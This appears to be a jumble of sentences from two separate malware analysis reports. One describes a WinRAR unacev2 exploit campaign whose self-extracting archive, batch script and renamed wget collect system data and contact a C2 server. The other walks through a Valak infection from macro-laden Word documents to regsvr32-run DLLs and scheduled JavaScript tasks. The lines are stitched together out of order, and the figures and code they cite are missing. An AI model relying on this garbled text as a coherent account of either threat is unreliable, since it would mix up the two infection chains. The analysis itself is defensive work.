1	Additionally, the malicious self-extracting archive contains a fake digital signature of a legitimate Microsoft tool - SysInternals Autoruns.
1	Once we have a password, we can check the internals of the win.exe file.
1	As can be seen in figure 15, it contains another executable file called winlog.exe.
1	Besides that, it has an embedded SFX script that is executed when the archive data is extracted:
1	This time, searching for the copyright, versions, and script we found a custom tool called Modified 7-Zip SFX module for installers, version 1.6.1 Stable build 3873 was used to create the malicious file.
1	The custom software produces a 7zip SFX archive with exactly the same timestamp as the malicious file.
1	The first one is called 5532.cmd, and it is a command prompt (batch) file.
1	The second file is an executable and is called config.exe.
1	It has a hardcoded C2 server, filename, and user-agent:
1	First, the malware extracts its proxy information from the registry key.
1	HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings.
1	It then saves the following information: ProxyServer (Proxy server address), ProxyUser (Proxy username), ProxyPass (Proxy password)
1	Next, it gets the name of the computer and generates a unique ID.
1	Once done, it calls the systeminfo utility and saves the whole output to a text file that in our case called ohJlkad.txt:
1	Initial data collection code
1	After that, it waits for 40 seconds using the command:
1	Once the timer ends, it will check for the internet connection by launching a ping command and sending 14 requests to google.com
1	ping n 14 google.com
1	Once finished, it kills the task with the filename stated in the configuration (librelogout.exe) and deletes the file.
1	Finally, it calls the config.exe application to provide several arguments:
1	In case the user is connected to the internet via proxy, it will provide additional arguments to config.exe:
1	In this case, the initial file mirotvorec.rar contains an exploit for the WinRAR unacev2 module.
1	After the config.exe returns, the script launches the main payload hosted on C2.
1	Collects information about the infected host
1	Sends it to the C2 via config.exe
1	Downloads and launches the main payload
1	Analyzing the config.exe file, we found out that it is a legit wget version (v 1.11.4) with OpenSSL support compiled for Windows
1	Another fact is that the .lnk shortcuts help simplify the forensic analysis of malicious campaigns by providing the amount of the information hidden from the user.
1	Another artifact left by the attackers is the password they used to unpack win.exe.
1	For a Windows computer to become infected, a victim must:
1	Open malspam with password-protected ZIP attachment.
1	Extract Microsoft Word document from the password-protected ZIP archive using a unique password from the message text.
1	Open the Word document as shown below in Figure 2 and enable macros.
1	An HTTP or HTTPS URL ending with .cab that returned a DLL to install Valak.
1	Valak DLL was saved to the C:\ProgramData\ directory using a random file name, usually with a .dat or .jpg file extension, as shown in Figure 3.
1	Valak DLL was run using regsvr32.exe -s [filename]
1	Popup message stating the DLL was successfully run, as shown in Figure 4.
1	A JavaScript configuration file appeared as a random file name (always the same name for each wave of infections) under the C:\Users\Public\ directory, as shown in Figures 5 and 6.
1	Initial HTTP command and control (C2) traffic returned encoded ASCII text used to create additional malware/artifacts for the infection.
1	Initial Valak DLL retrieved after enabling macros on the Word document from Figure 2.
1	Pop-up message on a Windows 10 host when an initial Valak DLL was successfully run using RegSvr32.exe after macros were enabled on June 24, 2020.
1	Initial script file in C:\Users\Public\ directory used during Valak infection from June 24, 2020.
1	A Windows executable (EXE) appeared in the infected user's AppData\Local\Temp directory as a random file name ending in .bin (PE32 executable, Mono/.Net assembly), as shown in Figure 7.
1	Windows registry entries were created under the key for HKCU\SOFTWARE\ApplicationContainer\Appsw64
1	A randomly-named text file and JavaScript (JS) file both appeared under the C:\Users\Public\ directory, as shown in Figures 8, 9 and 10.
1	A scheduled task was created to run the JS file located under C:\Users\Public\ and repeat running it every four minutes, as shown in Figure 11.
1	EXE file with a .bin file extension from the June 24, 2020, Valak infection.
1	Additional artifacts in the C:\Users\Public\ directory created during the infection.
